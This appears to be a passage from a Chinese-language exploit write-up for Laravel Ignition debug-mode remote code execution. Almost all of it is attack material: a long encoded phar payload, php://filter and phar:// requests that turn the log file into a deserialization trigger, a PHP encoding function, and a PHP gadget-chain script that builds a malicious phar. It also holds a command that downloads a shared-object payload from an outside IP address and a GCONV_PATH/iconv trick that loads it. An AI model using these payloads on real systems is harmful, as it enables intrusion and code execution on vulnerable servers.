57=00=78=00=30=00=59=00=30=00=63=00=35=00=65=00=57=00=52=00=46=00=54=00=6E=00=5A=00=69=00=62=00=56=00=70=00=77=00=57=00=6A=00=4E=00=57=00=65=00=56=00=6C=00=59=00=55=00=6E=00=5A=00=6A=00=61=00=55=00=6B=00=32=00=54=00=57=00=70=00=77=00=4E=00=32=00=4E=00=36=00=62=00=7A=00=4E=00=4E=00=61=00=6D=00=39=00=70=00=51=00=55=00=5A=00=4F=00=4E=00=57=00=4A=00=58=00=57=00=6E=00=5A=00=69=00=62=00=6D=00=78=00=6A=00=55=00=54=00=49=00=35=00=64=00=47=00=4E=00=48=00=4F=00=58=00=56=00=61=00=56=00=7A=00=55=00=77=00=57=00=45=00=5A=00=4B=00=64=00=6D=00=52=00=59=00=55=00=6E=00=42=00=69=00=62=00=57=00=52=00=6A=00=56=00=45=00=63=00=35=00=61=00=46=00=70=00=48=00=56=00=6E=00=6C=00=59=00=52=00=55=00=35=00=32=00=59=00=6D=00=31=00=61=00=63=00=46=00=6F=00=7A=00=56=00=6E=00=6C=00=5A=00=57=00=46=00=4A=00=32=00=59=00=32=00=78=00=34=00=53=00=6D=00=4A=00=59=00=51=00=6E=00=5A=00=6A=00=62=00=6C=00=4A=00=45=00=59=00=6A=00=49=00=31=00=62=00=57=00=46=00=58=00=5A=00=44=00=46=00=6A=00=62=00=55=00=59=00=77=00=59=00=6A=00=4E=00=4A=00=51=00=57=00=4E=00=48=00=52=00=6E=00=6C=00=61=00=56=00=7A=00=55=00=77=00=53=00=57=00=70=00=30=00=55=00=45=00=39=00=71=00=53=00=54=00=4A=00=50=00=61=00=55=00=70=00=4F=00=59=00=6A=00=4A=00=4F=00=63=00=6C=00=70=00=59=00=53=00=6A=00=56=00=59=00=52=00=57=00=68=00=77=00=57=00=6A=00=4A=00=6F=00=62=00=47=00=4E=00=72=00=4F=00=58=00=6C=00=61=00=52=00=31=00=5A=00=35=00=56=00=46=00=64=00=57=00=65=00=6D=00=4D=00=79=00=52=00=6D=00=35=00=61=00=55=00=30=00=6B=00=32=00=54=00=57=00=70=00=77=00=4E=00=32=00=4E=00=36=00=62=00=33=00=70=00=4E=00=61=00=6D=00=39=00=70=00=51=00=55=00=55=00=78=00=64=00=6C=00=6B=00=79=00=64=00=47=00=78=00=6A=00=62=00=6D=00=78=00=6A=00=55=00=30=00=64=00=73=00=62=00=6D=00=46=00=48=00=56=00=6E=00=6C=00=55=00=4D=00=30=00=70=00=72=00=57=00=6C=00=68=00=4B=00=54=00=6C=00=70=00=59=00=54=00=6E=00=70=00=5A=00=56=00=32=00=52=00=73=00=51=00=55=00=63=00=78=00=64=00=6C=00=6B=00=79=00=63=00=32=00=6C=00=50=00=4D=00=44=00=67=00=32=00=54=00=58=00=70=00=6E=00=4E=00=6B=00=6C=00=73=00=51=00=6B=00=6C=00=56=00=52=00=6C=00=5A=00=31=00=59=00=56=00=68=00=53=00=59=00=31=00=4A=00=75=00=53=00=6D=00=68=00=69=00=56=00=31=00=59=00=7A=00=59=00=6A=00=4E=00=4B=00=63=00=6C=00=68=00=46=00=4D=00=58=00=5A=00=5A=00=4D=00=6E=00=52=00=51=00=57=00=57=00=31=00=77=00=62=00=46=00=6B=00=7A=00=55=00=6D=00=4E=00=55=00=56=00=7A=00=6C=00=71=00=59=00=54=00=46=00=53=00=65=00=56=00=6C=00=58=00=62=00=44=00=42=00=4A=00=61=00=6D=00=39=00=35=00=54=00=32=00=35=00=30=00=65=00=6B=00=39=00=71=00=55=00=54=00=56=00=50=00=61=00=55=00=6C=00=42=00=56=00=55=00=56=00=6F=00=55=00=56=00=5A=00=58=00=4E=00=58=00=42=00=6B=00=52=00=6E=00=68=00=48=00=59=00=32=00=31=00=47=00=64=00=46=00=70=00=59=00=5A=00=48=00=5A=00=6A=00=62=00=58=00=52=00=6A=00=56=00=46=00=63=00=35=00=61=00=6D=00=45=00=77=00=4F=00=57=00=6C=00=68=00=62=00=56=00=5A=00=71=00=5A=00=45=00=5A=00=34=00=54=00=6D=00=49=00=79=00=54=00=6E=00=4A=00=57=00=53=00=45=00=70=00=6F=00=59=00=56=00=68=00=52=00=51=00=56=00=6B=00=79=00=65=00=47=00=68=00=6A=00=4D=00=30=00=35=00=45=00=59=00=6A=00=4A=00=53=00=62=00=45=00=6C=00=71=00=64=00=48=00=70=00=50=00=61=00=6D=00=4E=00=35=00=54=00=32=00=6C=00=4B=00=62=00=47=00=52=00=74=00=52=00=6E=00=4E=00=4C=00=52=00=31=00=70=00=77=00=59=00=6B=00=68=00=53=00=62=00=47=00=4E=00=73=00=4F=00=58=00=42=00=69=00=62=00=6B=00=49=00=78=00=5A=00=45=00=4E=00=6F=00=53=00=6C=00=52=00=73=00=51=00=6C=00=5A=00=57=00=52=00=6A=00=6C=00=49=00=55=00=6C=00=5A=00=52=00=63=00=30=00=6C=00=74=00=5A=00=33=00=70=00=6C=00=51=00=30=00=6C=00=77=00=53=00=31=00=52=00=7A=00=5A=00=31=00=70=00=58=00=54=00=6D=00=39=00=69=00=65=00=55=00=46=00=75=00=56=00=54=00=4A=00=57=00=62=00=45=00=6C=00=49=00=62=00=48=00=5A=00=6B=00=55=00=30=00=4A=00=77=00=59=00=6D=00=6C=00=43=00=4D=00=47=00=46=00=48=00=56=00=57=00=64=00=57=00=56=00=7A=00=56=00=36=00=57=00=6C=00=68=00=4B=00=63=00=46=00=6C=00=58=00=65=00=48=00=42=00=6C=00=62=00=56=00=56=00=6F=00=53=00=6E=00=70=00=7A=00=61=00=55=00=38=00=7A=00=54=00=54=00=5A=00=4F=00=52=00=47=00=63=00=32=00=53=00=57=00=64=00=43=00=55=00=56=00=4E=00=47=00=51=00=6C=00=5A=00=69=00=62=00=57=00=77=00=77=00=57=00=45=00=56=00=61=00=65=00=56=00=6C=00=58=00=4D=00=57=00=78=00=6B=00=4D=00=6A=00=6C=00=35=00=59=00=54=00=46=00=34=00=54=00=6D=00=49=00=79=00=54=00=6E=00=4A=00=55=00=4D=00=6B=00=70=00=78=00=57=00=6C=00=64=00=4F=00=4D=00=46=00=68=00=46=00=4D=00=58=00=5A=00=5A=00=4D=00=6E=00=52=00=56=00=59=00=32=00=31=00=47=00=63=00=47=00=52=00=42=00=51=00=6E=00=52=00=69=00=4D=00=6B=00=35=00=79=00=56=00=47=00=31=00=47=00=64=00=46=00=70=00=54=00=53=00=54=00=64=00=6A=00=65=00=6D=00=39=00=34=00=54=00=58=00=70=00=76=00=61=00=57=00=52=00=58=00=4E=00=57=00=74=00=61=00=56=00=31=00=70=00=77=00=59=00=6D=00=31=00=57=00=61=00=31=00=52=00=58=00=4F=00=57=00=70=00=68=00=65=00=55=00=6B=00=33=00=5A=00=6C=00=68=00=4E=00=4E=00=6B=00=31=00=36=00=55=00=54=00=5A=00=4A=00=5A=00=30=00=4A=00=4F=00=59=00=6A=00=4A=00=4F=00=63=00=6C=00=70=00=59=00=53=00=6A=00=56=00=59=00=52=00=57=00=68=00=77=00=57=00=6A=00=4A=00=6F=00=62=00=47=00=4E=00=72=00=4F=00=58=00=6C=00=61=00=52=00=31=00=5A=00=35=00=56=00=46=00=64=00=57=00=65=00=6D=00=4D=00=79=00=52=00=6D=00=35=00=61=00=55=00=55=00=4A=00=30=00=57=00=6C=00=68=00=53=00=62=00=32=00=49=00=79=00=55=00=57=00=6C=00=50=00=4D=00=30=00=30=00=32=00=54=00=30=00=52=00=76=00=61=00=56=00=6F=00=79=00=56=00=6E=00=56=00=61=00=57=00=45=00=70=00=6F=00=5A=00=45=00=64=00=56=00=61=00=55=00=38=00=7A=00=4D=00=58=00=70=00=50=00=61=00=6D=00=4E=00=34=00=54=00=32=00=6C=00=4A=00=51=00=56=00=55=00=7A=00=62=00=48=00=52=00=61=00=62=00=54=00=6C=00=31=00=5A=00=56=00=5A=00=34=00=52=00=47=00=49=00=79=00=4D=00=58=00=64=00=69=00=4D=00=6A=00=56=00=73=00=59=00=6D=00=35=00=53=00=59=00=31=00=56=00=74=00=4F=00=54=00=46=00=6B=00=52=00=32=00=78=00=31=00=57=00=6A=00=46=00=34=00=54=00=57=00=49=00=79=00=52=00=6D=00=74=00=61=00=57=00=45=00=70=00=6A=00=55=00=54=00=49=00=35=00=64=00=56=00=70=00=74=00=62=00=47=00=35=00=6B=00=57=00=45=00=70=00=6F=00=5A=00=45=00=63=00=35=00=65=00=56=00=68=00=46=00=62=00=48=00=52=00=6A=00=52=00=7A=00=6C=00=35=00=5A=00=45=00=56=00=4F=00=64=00=6D=00=4A=00=74=00=57=00=6E=00=42=00=61=00=4D=00=31=00=5A=00=35=00=57=00=56=00=68=00=53=00=64=00=6D=00=4E=00=6E=00=51=00=6E=00=6C=00=69=00=4D=00=31=00=59=00=77=00=57=00=6C=00=4E=00=4A=00=4E=00=32=00=4E=00=36=00=62=00=7A=00=42=00=50=00=61=00=55=00=6F=00=77=00=57=00=6C=00=68=00=4F=00=4D=00=45=00=6C=00=71=00=64=00=44=00=6C=00=44=00=51=00=55=00=46=00=42=00=51=00=55=00=68=00=53=00=62=00=47=00=4D=00=7A=00=55=00=58=00=56=00=6B=00=53=00=47=00=67=00=77=00=51=00=6B=00=46=00=42=00=51=00=55=00=46=00=49=00=55=00=6A=00=68=00=58=00=56=00=30=00=46=00=46=00=51=00=55=00=46=00=42=00=51=00=55=00=52=00=49=00=4E=00=53=00=38=00=79=00=54=00=46=00=6C=00=43=00=51=00=55=00=46=00=42=00=51=00=55=00=46=00=42=00=51=00=55=00=46=00=6B=00=52=00=31=00=5A=00=36=00=5A=00=46=00=42=00=74=00=52=00=45=00=52=00=46=00=59=00=6C=00=4E=00=33=00=59=00=57=00=74=00=52=00=62=00=46=00=46=00=31=00=52=00=55=00=39=00=45=00=55=00=45=00=5A=00=61=00=65=00=6D=00=39=00=48=00=62=00=47=00=64=00=6A=00=61=00=30=00=46=00=6E=00=51=00=55=00=46=00=42=00=52=00=57=00=52=00=44=00=56=00=46=00=56=00=4A=00=50=00=53=00=63=00=70=00=4B=00=54=00=73=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=44=00=67=00=36=00=49=00=67=00=42=00=51=00=53=00=46=00=42=00=56=00=62=00=6D=00=6C=00=30=00=58=00=45=00=5A=00=79=00=59=00=57=00=31=00=6C=00=64=00=32=00=39=00=79=00=61=00=31=00=78=00=4E=00=62=00=32=00=4E=00=72=00=54=00=32=00=4A=00=71=00=5A=00=57=00=4E=00=30=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=55=00=63=00=6D=00=46=00=70=00=64=00=41=00=42=00=74=00=62=00=32=00=4E=00=72=00=54=00=6D=00=46=00=74=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=64=00=57=00=35=00=6B=00=5A=00=57=00=5A=00=70=00=62=00=6D=00=56=00=6B=00=54=00=57=00=39=00=6A=00=61=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4D=00=7A=00=51=00=36=00=49=00=67=00=42=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=68=00=70=00=5A=00=32=00=68=00=6C=00=63=00=6B=00=39=00=79=00=5A=00=47=00=56=00=79=00=54=00=57=00=56=00=7A=00=63=00=32=00=46=00=6E=00=5A=00=51=00=42=00=74=00=5A=00=58=00=52=00=6F=00=62=00=32=00=51=00=69=00=4F=00=33=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=5A=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=55=00=69=00=4F=00=33=00=31=00=7A=00=4F=00=6A=00=63=00=78=00=4F=00=69=00=49=00=41=00=55=00=33=00=6C=00=74=00=5A=00=6D=00=39=00=75=00=65=00=56=00=78=00=44=00=62=00=32=00=31=00=77=00=62=00=32=00=35=00=6C=00=62=00=6E=00=52=00=63=00=55=00=6D=00=39=00=31=00=64=00=47=00=6C=00=75=00=5A=00=31=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=4A=00=63=00=51=00=32=00=39=00=75=00=5A=00=6D=00=6C=00=6E=00=64=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=6C=00=74=00=63=00=47=00=39=00=79=00=64=00=45=00=4E=00=76=00=62=00=6D=00=5A=00=70=00=5A=00=33=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=67=00=42=00=79=00=62=00=33=00=56=00=30=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=30=00=5A=00=58=00=4E=00=30=00=49=00=6A=00=74=00=39=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=41=00=42=00=39=00=57=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4C=00=59=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=45=00=65=00=49=00=6A=00=47=00=38=00=51=00=6D=00=6D=00=79=00=52=00=41=00=58=00=63=00=48=00=64=00=4E=00=68=00=69=00=6B=00=77=00=71=00=59=00=42=00=35=00=6F=00=37=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00"
  }
}
```

```
{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}
```

```
{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "phar:///var/www/html/storage/logs/laravel.log/test.txt"
  }
}
```

```
将phar文件编码
function TransferEncodePhar($file){
    $raw = base64_encode(file_get_contents($file));
    $result = array();
    for($i = 0; $i < strlen($raw); $i++){
        $result[$i] = "=" . strtoupper(dechex(ord($raw[$i]))) . "=00";
    }
    return implode($result);
}
```

```
$it = new DirectoryIterator("glob:///*");foreach($it as $f) {echo($f->__toString().' ');}
```

```
下载so文件
h3x=file_put_contents("/tmp/payload.so",file_get_contents("http://42.192.142.64:9563/payload.so"));
```

```
查看tmp目录下的文件
var_dump(scandir("/tmp"));
```

```
触发so文件
h3x=putenv('GCONV_PATH=/tmp/');file_put_contents('php://filter/write=convert.iconv.payload.utf-8/resource=/tmp/122','Hello!Dem0');
```

```
file_put_contents('php://filter/write=convert.iconv.payload.utf-8/resource=/tmp/demo',123);
```

下面是生成phar的脚本，里面的aba.phar就是你想生成的单独的全新的phar文件，就可以。然后运行下面的脚本，再运行上面的编码函数，写入log即可。

```
<?php
namespace Symfony\Component\Routing\Loader\Configurator {

    class ImportConfigurator
    {
        private $parent;
        private $route;

        public function __construct($parent)
        {
            $this->parent = $parent;
            $this->route = "test";
        }

    }
}
namespace Mockery {

    class HigherOrderMessage
    {
        private $mock;
        private $method;

        public function __construct($mock)
        {
            $this->mock = $mock;
            $this->method = "generate";
        }
    }
}

namespace PHPUnit\Framework\MockObject {

    final class MockTrait
    {
        private $classCode;
        private $mockName;

        public function __construct()
        {
            $phar = base64_encode(file_get_contents("aba.phar"));
            $this->classCode = "echo 'Unserialize!'; file_put_contents('/var/www/html/storage/logs/demo.log',base64_decode('{$phar}'));";
            $this->mockName = "undefinedMock";
        }
    }
}

namespace {
    use \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator;
    use \Mockery\HigherOrderMessage;
    use \PHPUnit\Framework\MockObject\MockTrait;
    $c=new MockTrait();
    $b = new HigherOrderMessage($c);
    $a= new ImportConfigurator($b);
    $phar = new Phar('vul.phar');
    $phar->startBuffering();
    $phar->addFromString("test.txt","test");
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($a);
    $phar->stopBuffering();
}
```

参考链接:https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g